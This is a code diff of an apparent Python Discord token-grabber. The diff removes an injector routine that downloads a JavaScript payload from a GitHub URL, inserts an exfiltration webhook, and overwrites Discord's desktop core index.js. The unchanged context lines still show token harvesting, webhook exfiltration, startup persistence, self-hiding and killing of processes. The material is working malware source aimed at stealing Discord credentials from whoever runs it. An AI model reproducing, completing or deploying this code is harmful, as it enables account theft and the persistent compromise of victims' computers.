@@ -21,7 +21,6 @@ from win32crypt import CryptUnprotectData
 
 config = {
     'webhook': "WEBHOOK_HERE",
-    'injection_url': "https://raw.githubusercontent.com/KRONIKER-KNK/Discord-Injection/main/injection.js",
     'kill_processes': True,
     'startup': True,
     'hide_self': True,
@@ -171,7 +170,6 @@ class kroniker_tokengrabber(functions):
             except RuntimeError:
                 continue
         self.neatifyTokens()
-        await self.injector()
         self.finish()
         shutil.rmtree(self.dir)
 
@@ -183,34 +181,6 @@ class kroniker_tokengrabber(functions):
             shutil.copy2(argv[0], self.startup_loc)
         except Exception:
             pass
-
-    async def injector(self):
-        for _dir in os.listdir(self.appdata):
-            if 'discord' in _dir.lower():
-                discord = self.appdata+self.sep+_dir
-                disc_sep = discord+self.sep
-                for __dir in os.listdir(os.path.abspath(discord)):
-                    if match(r'app-(\d*\.\d*)*', __dir):
-                        app = os.path.abspath(disc_sep+__dir)
-                        inj_path = app+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\'
-                        if os.path.exists(inj_path):
-                            if self.startup_loc not in argv[0]:
-                                try:
-                                    os.makedirs(
-                                        inj_path+'initiation', exist_ok=True)
-                                except PermissionError:
-                                    pass
-                            if "api/webhooks" in self.webhook:
-                                f = httpx.get(self.fetchConf('injection_url')).text.replace("%WEBHOOK%", self.webhook)
-                            else:
-                                f = httpx.get(self.fetchConf('injection_url')).text.replace("%WEBHOOK%", self.webhook).replace("%WEBHOOK_KEY%")
-                            try:
-                                with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
-                                    indexFile.write(f)
-                            except PermissionError:
-                                pass
-                            if self.fetchConf('kill_processes'):
-                                os.startfile(app + self.sep + _dir + '.exe')
 
     async def killProcesses(self):
         blackListedPrograms = self.fetchConf('blackListedPrograms')
